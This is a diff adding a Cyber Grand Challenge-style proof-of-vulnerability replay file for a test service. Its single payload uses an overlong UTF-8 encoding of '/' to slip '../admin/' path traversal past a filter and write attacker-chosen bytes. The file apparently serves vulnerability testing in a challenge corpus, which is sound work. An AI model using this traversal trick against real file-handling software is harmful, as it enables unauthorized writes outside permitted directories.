@@ -1,0 +1,15 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE pov SYSTEM "/usr/share/cgc-docs/replay.dtd">
+<pov>
+    <cbid>service</cbid>
+    <replay>
+        <!-- reliability -->
+        <delay>100</delay>
+
+        <!-- Write 0x42424242 to ../admin/\x41\x41\x41\x41 -->
+        <write><data>\x01\x00\x00\x00\x2e\x2e\xc0\xaf\x61\x64\x6d\x69\x6e\xc0\xaf\x41\x41\x41\x41\x00\x04\x00\x00\x00\x42\x42\x42\x42</data></write>
+
+        <!-- Terminate if patched -->
+        <write><data>\xff\xff\xff\xff</data></write>
+    </replay>
+</pov>
